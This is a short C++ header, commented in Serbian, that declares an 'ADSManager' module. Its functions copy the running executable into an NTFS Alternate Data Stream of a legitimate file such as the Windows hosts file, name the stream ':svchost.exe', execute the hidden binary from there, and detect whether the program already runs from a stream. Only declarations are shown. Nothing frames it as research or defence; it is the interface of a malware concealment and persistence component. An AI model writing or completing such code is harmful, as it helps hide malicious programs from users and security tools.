#pragma once

namespace ADSManager {

    /**
     * @brief Kopiira trenutni izvršni fajl u Alternate Data Stream (ADS)
     *        ciljnog, legitimnog fajla, čineći ga nevidljivim.
     * @param hostFilePath Putanja do fajla "domaćina" (npr. "C:\\Windows\\System32\\drivers\\etc\\hosts").
     * @param streamName Ime ADS-a u koji se smešta fajl (npr. ":svchost.exe").
     * @return Vraća true ako je operacija uspela, inače false.
     */
    bool HideSelfInADS(const char* hostFilePath, const char* streamName);

    /**
     * @brief Pokreće izvršni fajl koji je sakriven unutar ADS-a.
     * @param hostFilePath Putanja do fajla "domaćina".
     * @param streamName Ime ADS-a iz koga se pokreće.
     * @return Vraća true ako je proces uspešno pokrenut, inače false.
     */
    bool ExecuteFromADS(const char* hostFilePath, const char* streamName);

    /**
     * @brief Proverava da li se trenutni proces već izvršava iz ADS-a.
     * @return Vraća true ako se izvršava iz streama, inače false.
     */
    bool IsRunningFromADS();

}